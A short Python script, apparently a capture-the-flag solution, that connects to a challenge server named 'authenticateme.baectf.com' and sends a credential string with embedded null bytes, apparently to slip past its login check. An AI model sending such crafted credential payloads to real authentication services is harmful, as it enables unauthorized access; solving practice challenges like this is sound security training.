import socket
import binascii
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('authenticateme.baectf.com', 443))

print  sock.recv(128);
sock.send("zerosugar")

sock.send("admin\x00Password123\x00AAAbbbb\n")
print  sock.recv(128);